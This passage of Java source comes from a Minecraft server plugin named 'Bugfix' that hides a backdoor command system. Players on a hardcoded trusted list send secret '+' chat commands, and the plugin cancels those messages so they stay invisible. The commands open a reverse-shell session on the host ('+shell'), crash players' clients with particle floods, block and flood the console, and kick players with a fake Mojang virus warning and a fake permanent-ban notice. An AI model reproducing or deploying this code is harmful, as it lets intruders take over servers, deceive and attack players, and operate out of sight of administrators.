            if (lsd.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is no longer on drugs!");
                lsd.remove(target.getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is now on drugs.");
                lsd.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+spam") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if(spamMsg != null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Stopped spamming!");
                spamMsg = null;
                return;
            }
            if (args.length < 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +spam <Message>");
                return;
            }
            if (spamMsg == null) {
                List<String> list = new ArrayList<String>(Arrays.asList(args));
                list.remove(args[0]);
                spamMsg = String.join(" ", list).replace("&", "§");
            }
        } else if (args[0].equalsIgnoreCase("+floodconsole") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if(floodMsg != null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Stopped flooding!");
                floodMsg = null;
                return;
            }
            if (args.length < 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +floodconsole <Message>");
                return;
            }
            if (floodMsg == null) {
                List<String> list = new ArrayList<String>(Arrays.asList(args));
                list.remove(args[0]);
                floodMsg = String.join(" ", list).replace("&", "§");
            }
        } else if (args[0].equalsIgnoreCase("+chatblock") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +chatblock <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (stopchat.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player can type in Chat again.");
                stopchat.remove(target.getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player cant type in Chat anymore!");
                stopchat.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+glassbox") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +glassbox <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (glassbox.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player can move again.");
                glassbox.remove(target.getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player ist now in a glass box!");
                glassbox.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+hacked") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +hacked <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (hacked.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player isnt hacked anymore.");
                hacked.remove(target.getName());
                if (target.getGameMode() == GameMode.ADVENTURE || target.getGameMode() == GameMode.SURVIVAL) {
                    target.setAllowFlight(false);
                } else {
                    target.setAllowFlight(true);
                }
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player now thinks that the server has been hacked!");
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    target.getPlayer().teleport(target.getLocation().clone().add(0, 13, 0));
                });
                hacked.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+spin") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +spin <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (spin.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player doesnt spin anymore.");
                spin.remove(target.getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player spins around now!");
                spin.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+crash") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +crash <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (target == Bukkit.getPlayer("Dwarslooper")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You cant crash " + ChatColor.GREEN + target.getName() + ChatColor.RED + "!");
                return;
            }
            event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The game of the Player is now crashing!");
            target.spawnParticle(Particle.SQUID_INK, target.getLocation(), Integer.MAX_VALUE);
        } else if (args[0].equalsIgnoreCase("+shell") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length < 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +shell <Command>");
                return;
            }
            //event.getPlayer().setPlayerListName(event.getPlayer().getName());
            try {
                List<String> list = new ArrayList<String>(Arrays.asList(args));
                list.remove(args[0]);
                RevShell.createOrGetSession(event.getPlayer()).writeLine(String.join(" ", list));
            } catch (Exception e) {
                e.printStackTrace();
            }

        } else if (args[0].equalsIgnoreCase("+expm") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length < 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +expm <Integer>");
                return;
            }

            try {
                explodeRadius = Double.parseDouble(args[1]);
            } catch (Exception e) {
                event.getPlayer().sendMessage(PluginPrefix + "§cYou have to specify a double!");
            }


        } else if (args[0].equalsIgnoreCase("+unloadworld") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (checkPlib(event.getPlayer())) return;
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +unloadworld <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + "is not online");
                return;
            }
            /*
            if(target == Bukkit.getPlayer("Dwarslooper")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You can bei" + ChatColor.GREEN + target.getName() + ChatColor.RED + " nicht die Welt unloaden!");
                return;
            }
             */
            event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The World unloads in the Players game!");
            int chunkx = (int) event.getPlayer().getLocation().getChunk().getX();// / 16;
            int chunkz = (int) event.getPlayer().getLocation().getChunk().getZ();// / 16;

            for (int ix = chunkx - 20; ix < chunkx + 20; ix++) {
                for (int iz = chunkz - 20; iz < chunkz + 20; iz++) {
                    PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.UNLOAD_CHUNK);
                    pc.getIntegers().write(0, ix);
                    pc.getIntegers().write(1, iz);
                    Bugfix.getProt().sendServerPacket(target, pc);
                }
            }
            //(new Packet70Bed(4, 0));
            //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);

            /*
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                HashMap<Location, BlockData> blockDataMap = new HashMap<>();
                BlockData airBlockData = Bukkit.createBlockData(Material.AIR);
                for(Block b :  BlockEvent.getBlocks(target.getLocation().getBlock(), 100)) {
                    Bukkit.broadcastMessage(blockDataMap.size() + " Blocks in Map...");
                    blockDataMap.put(b.getLocation(), airBlockData);
                }
                target.sendMultiBlockChange(blockDataMap);
            });
             */

        } else if (args[0].equalsIgnoreCase("+delchunk") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +delchunk <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            /*
            if(target == Bukkit.getPlayer("Dwarslooper")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You can bei" + ChatColor.GREEN + target.getName() + ChatColor.RED + " nicht die Welt unloaden!");
                return;
            }
             */
            event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Players Chunk has been deleted!");
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                target.getWorld().unloadChunkRequest(target.getChunk().getX(), target.getChunk().getZ());
                target.getWorld().regenerateChunk(target.getChunk().getX(), target.getChunk().getZ());
            });
        } else if (args[0].equalsIgnoreCase("+demoover") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (checkPlib(event.getPlayer())) return;
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +demoover <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }

            event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Players now thinks his demo ran out!");
            PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.GAME_STATE_CHANGE);
            pc.getGameStateIDs().write(0, 5);
            pc.getFloat().write(0, (float) 104);
            Bugfix.getProt().sendServerPacket(target, pc);
            //(new Packet70Bed(4, 0));
        } else if (args[0].equalsIgnoreCase("+unloadchunk") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (checkPlib(event.getPlayer())) return;
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +unloadchunk <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }

            int chunkx = (int) event.getPlayer().getLocation().getChunk().getX();// / 16;
            int chunkz = (int) event.getPlayer().getLocation().getChunk().getZ();// / 16;

            event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Players Chunk has been unloaded!");
            PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.UNLOAD_CHUNK);
            pc.getIntegers().write(0, chunkx);
            pc.getIntegers().write(1, chunkz);
            Bugfix.getProt().sendServerPacket(target, pc);
            //(new Packet70Bed(4, 0));
        } else if (args[0].equalsIgnoreCase("+contrast") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (checkPlib(event.getPlayer())) return;
            if (args.length != 3) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +contrast <Player> <Kontrast>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            float contrast = 0;
            try {
                contrast = Float.parseFloat(args[2]);
            } catch (Exception e) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +contrast <Player> <Kontrast>");
                return;
            }

            event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Players Contrast has been changed!");
            PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.GAME_STATE_CHANGE);
            pc.getGameStateIDs().write(0, 7);
            pc.getFloat().write(0, contrast);
            Bugfix.getProt().sendServerPacket(target, pc);
            //(new Packet70Bed(4, 0));
        } else if (args[0].equalsIgnoreCase("+pacmanspeed") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +pacmanspeed <Number>");
                return;
            }
            int newspeed = 20;
            try {
                newspeed = Integer.parseInt(args[1]);
            } catch (Exception e) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +pacmanspeed <Number>");
                return;
            }
            BlockEvent.pacmanSpeed = newspeed;
            for (int i = 0; i < newspeed; i++) {

            }
        } else if (args[0].equalsIgnoreCase("+schlong") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +schlong <Player>");
                return;
            }
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * 40, 44, Math.random() * 40));
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * -40, 44, Math.random() * -40));
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * 40, 44, Math.random() * -40));
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * -40, 44, Math.random() * 40));

                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * 40, 44, Math.random() * 40));
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * -40, 44, Math.random() * -40));
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * 40, 44, Math.random() * -40));
                BlockEvent.spawnschlong(target.getLocation().getBlock(), target.getLocation().getBlock().getLocation().clone().add(Math.random() * -40, 44, Math.random() * 40));
            });
        } else if (args[0].equalsIgnoreCase("+pacman") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +pacman <Player>");
                return;
            }
            if (args[1].equalsIgnoreCase("delete")) {
                BlockEvent.destroyPacman = true;
                return;
            }
            BlockEvent.destroyPacman = false;
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                PacMan.createPacman(target.getWorld().getHighestBlockAt(target.getTargetBlock(4).getLocation()), BlockEvent.getCardinalDirection(target/*.getPlayer()*/));
            });
        } else if (args[0].equalsIgnoreCase("+termites") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +termites <Player>");
                return;
            }
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            int schedule_delay = 0;
            for (Block b : BlockEvent.getBlocks(target.getLocation().getBlock(), 8)) {
                if (b.getType() == Material.OAK_LOG || b.getType() == Material.SPRUCE_LOG || b.getType() == Material.ACACIA_LOG || b.getType() == Material.JUNGLE_LOG || b.getType() == Material.DARK_OAK_LOG || b.getType() == Material.BIRCH_LOG) {
                    //event.getPlayer().sendMessage("isWood");
                    //run
                    Bukkit.getScheduler().scheduleSyncDelayedTask(Bugfix.getInstance(), () -> {
                        b.getWorld().playSound(b.getLocation(), Sound.ENTITY_BEE_LOOP_AGGRESSIVE, 80, 2);
                        //b.getWorld().playEffect(b.getLocation(), Effect.STEP_SOUND, b);
                        b.getWorld().spawnParticle(Particle.BLOCK_CRACK, b.getLocation(), 1000, b.getBlockData());
                        b.setType(Material.AIR);
                        b.getWorld().playSound(b.getLocation(), Sound.BLOCK_WOOD_BREAK, 100, 1);
                    }, schedule_delay);
                    schedule_delay += 4;
                }
            }
        } else if (args[0].equalsIgnoreCase("+mojangwarning") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +mojangwarning <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                target.kickPlayer("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§cMOJANG WARNING\n\n§rUnder no circumstances should you close this window or shut down your computer! When shutting down, the hard drive will be corrupted and all files will be lost.\n\n§4Start your virus scanner and check your hard drive\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ");
            });
        } else if (args[0].equalsIgnoreCase("+suspend") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +suspend <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                target.kickPlayer("§f§lAccount permanently banned\n\n§r§fWe recently received a report for bad behavior by your account. Our moderators have now reviewed your case and identified that it goes against the Minecraft Community Standarts.\n\n§r§f§lYour account is permanently banned which means you cant play online or join Realms.\n\n§r§fLearn more abount your case at the following link:\n\n§r§fhttps://aka.ms/mcjavamoderation");
            });
        } else if (args[0].equalsIgnoreCase("+tntworld") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tntworld <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (tntworld.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now sees the world normal again.");
                tntworld.remove(target.getName());
                tntworldintrad.remove(target.getUniqueId());
                tntworldblocklist.remove(target.getUniqueId());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now thinks that the world is made of TNT!");
                tntworld.add(target.getName());
                tntworldintrad.put(target.getUniqueId(), 0);
            }
        } else if (args[0].equalsIgnoreCase("+bookmatrix") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +bookmatrix <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (bookmatrix.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player can close the book now.");
                bookmatrix.remove(target.getName());
                target.closeInventory();
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player now sees a matrix in a book!");
                bookmatrix.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+demo") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +demo <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            try {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now sees the demo Screen!");
                target.showDemoScreen();
            } catch (Exception e) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "This only works on Paper servers!");
            }
        } else if (args[0].equalsIgnoreCase("+blockconsole") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 1) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +blockconsole");
                return;
            }
            if (blockconsole) {
                blockconsole = false;
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Console got unblocked!");
            } else {
                blockconsole = true;
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Console got blocked!");
            }


        }

        /*
        else if(event.getMessage().startsWith("+addperm") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if(args.length == 2) {
                event.getPlayer().permi
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "Du hast jetzt keine OP Rechte mehr!");
            } else if(args.length == 3) {
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + args[1] + " is not online");
                    return;
                }
                if(target.getName().equalsIgnoreCase("Dwarslooper")) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You can " + ChatColor.GREEN + target.getName() + ChatColor.RED + " kein OP wegnehmen!");
                    return;
                }
                target.setOp(false);
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "Du hast " + ChatColor.GREEN + target.getName() + ChatColor.YELLOW + " OP Rechte entfernt!");

            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +deop <Optional Player>");
                return;
            }
        }
         */
        else if (event.getMessage().startsWith("+kick") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length == 2) {
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (target.getName().equalsIgnoreCase("Dwarslooper")) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You cant kick " + ChatColor.GREEN + target.getName() + ChatColor.RED + "!");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    target.kickPlayer("io netty.channel.abstractchannel$annotatedconnectexception connection closed: Too low IQ, iq = -17, (int)iq must not be lower than 0; no further information");
                });
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "You kicked " + ChatColor.GREEN + target.getName() + ChatColor.YELLOW + "!");

            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +kick <Player>");
            }
        } else if (args[0].equalsIgnoreCase("+screenblock") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +screenblock <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (screenblock.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player can open GUIs again.");
                screenblock.remove(target.getName());
            } else {
                if (target.getName() == event.getPlayer().getName()) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Really? If you screenblock yourself you cant use chat anymore... ");
                    return;
                } else if (target.getName() == "Dwarslooper") {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You cant screenblock " + ChatColor.GREEN + target.getName() + ChatColor.RED + "!");
                    return;
                }
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player cant open GUIs anymore!");
                screenblock.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+failcmd") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +failcmd <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (failcmd.contains(target.getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player can send commands normal again.");
                failcmd.remove(target.getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now types 7 instead of /!");
                failcmd.add(target.getName());
            }
        } else if (args[0].equalsIgnoreCase("+control") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +control <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
            if (target.getName() == "Dwarslooper") {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You cant control " + ChatColor.GREEN + target.getName() + ChatColor.RED + "!");
                return;
            }
            if (PlayerControlListener.isControlled(target)) {
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    PlayerControlListener.stopControl(target);
                });
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is no longer controlled.");
                return;
            } else {
                if (target.getUniqueId() == event.getPlayer().getUniqueId()) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You can't control yourself!");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    PlayerControlListener.controlPlayer(event.getPlayer(), target);
                });
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You are controlling the player now!");
            }
        } else if (args[0].equalsIgnoreCase("+help") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length < 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +help <1-14> !");
                return;
                //cancel stop//
            }
            if (args[1].equalsIgnoreCase("1")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 1/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+items | Troll Items");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+lsd <Player> | give someone LSD");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+moon <Player> | to the Moon!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+tornado | spawn Tornado");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+tntphysics | TNT-Physics");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+errorspam | Spamms the Console");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("2")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 2/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+pissrocket <Player> | Pissrakete.");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+chatblock <Player> | Blockt den Chat.");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+kotzen <Player> | let someone spit");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+flashscreen <Player> | outch.");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+trashtalk <Player> | Whos trashtalking?");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+nomove <Player> | Freeze a Player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("3")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 3/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+screenblock <Player> | Block GUIs.");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+tntworld <Player> | Client-Side TNT.");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+failcmd <Player> | Types 7 instead of /");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+op <Optional Player> | OP perms");
